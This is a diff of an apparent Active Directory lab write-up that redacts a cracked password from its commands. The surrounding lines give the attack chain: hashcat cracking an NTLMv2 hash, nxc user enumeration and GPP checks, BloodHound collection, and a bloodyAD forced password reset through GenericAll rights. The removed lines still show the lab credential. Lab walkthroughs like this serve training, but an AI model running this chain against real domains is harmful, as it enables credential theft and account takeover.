@@ -99,7 +99,7 @@ When a user browses the share, Responder captures their NTLMv2 hash:
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Cracked:** `bob.ross : 137Password123!@#`
+**Cracked:** `bob.ross : REDACTED`
 
 ---
 
@@ -108,7 +108,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 Validate credentials and enumerate users:
 
 ```bash
-nxc smb hack.smarter -u 'bob.ross' -p '137Password123!@#' --rid-brute
+nxc smb hack.smarter -u 'bob.ross' -p 'REDACTED' --rid-brute
 ```
 
 **Users discovered:**
@@ -119,7 +119,7 @@ nxc smb hack.smarter -u 'bob.ross' -p '137Password123!@#' --rid-brute
 Check for GPP passwords in SYSVOL (classic AD misconfiguration):
 
 ```bash
-nxc smb hack.smarter -u 'bob.ross' -p '137Password123!@#' -M gpp_password
+nxc smb hack.smarter -u 'bob.ross' -p 'REDACTED' -M gpp_password
 ```
 
 No GPP credentials found — moving to BloodHound.
@@ -131,7 +131,7 @@ No GPP credentials found — moving to BloodHound.
 Collect BloodHound data using `bob.ross`:
 
 ```bash
-nxc ldap dc01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.145.243
+nxc ldap dc01.hack.smarter -u 'bob.ross' -p 'REDACTED' --bloodhound --collection All --dns-server 10.1.145.243
 ```
 
 **Key finding:** `bob.ross` has **GenericAll** over `alice.wonderland`.
@@ -151,7 +151,7 @@ GenericAll grants full control over an object — including the ability to **cha
 ### Step 1 — Force-change Alice's password using GenericAll
 
 ```bash
-bloodyAD -u 'bob.ross' -p '137Password123!@#' -d hack.smarter -H 10.1.145.243 set password alice.wonderland 'NewPass123!'
+bloodyAD -u 'bob.ross' -p 'REDACTED' -d hack.smarter -H 10.1.145.243 set password alice.wonderland 'NewPass123!'
 ```
 
 ### Step 2 — Connect via Evil-WinRM
